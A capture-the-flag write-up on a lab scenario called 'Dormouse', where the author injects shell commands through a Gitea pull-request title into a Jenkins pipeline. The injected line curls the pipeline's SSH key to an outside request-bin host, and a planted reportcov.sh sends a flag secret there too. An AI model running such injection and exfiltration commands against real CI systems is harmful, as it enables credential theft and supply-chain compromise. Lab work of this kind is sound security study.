# Dormouse

Our git user `thealice` has read access to the `Wonderland/dormouse` repository, but no write access. 

We can see there is a Jenkinsfile, and upon closer examination it appears to be running a script that it pulls from a remote host, `http://prod/reportcov.sh`.

With a little more sleuthing, we notice that in Gitea there is another organization defined, `Cov` with a single repository, `reportcov`. `thealice` also has read access to this repository, but like the former, no write.

Examining the Jenkinsfile in `reportcov`, we see it has two stages triggered by pull requests(being opened) and pushes respectively. We can't trigger a push to the main repo, so our only option is to somehow leverage opening pull requests. 

This also clues us in to the fact that there is a hidden pipeline in Jenkins that our `alice` Jenkins user cannot see.

I went down a rabbit hole trying to get either pipeline to work with a `reportconv.sh` that I manipulated myself. This led nowhere, unfortunately, so I looked at the clues.

This clued me in to the fact that the pull request stage is using unsanitized input from Gitea in order to craft an email. We can leverage this to inject our own commands into the pipeline by crafting our own special malicious title field and opening a pull request.

It took a while, but I was finally able to get the server to POST me the SSH key it was using in the latter stage(which we can't trigger), which itself is uploading `reportconv.sh` to a server that the `dormouse` pipeline will later come along and retrieve.

Using this title I was able to get the key:

```sh
&& curl -F "data=${key}" "https://eopmm0zwhtza68y.m.pipedream.net" -H "Authorization: Token testfromjenkins" || true && echo
```

From there, I think it is within reasonable scope to use this key to write our own malicious reportcov.sh script that the dormouse pipeline will use. 

Since this is all within a docker environment, I used the `localstack` container to copy over the malicious file(the only container I found that had ssh tools installed). You could probably do this from the host itself, but I didn't care to figure out how at this time.

From the `localstack container`:

```sh
echo 'curl -F "f=r" "https://eopmm0zwhtza68y.m.pipedream.net" -H "Authorization: Token ${FLAG}" || true' > reportcov.sh
echo "<key>" > key
chmod 600 key
scp -v -i key -o StrictHostKeyChecking=no reportcov.sh root@prod:/var/www/localhost/htdocs
```

Now when the dormouse pipeline runs, it will copy this script and execute the curl containing the flag in the Authorization HTTP header to our request bin. 
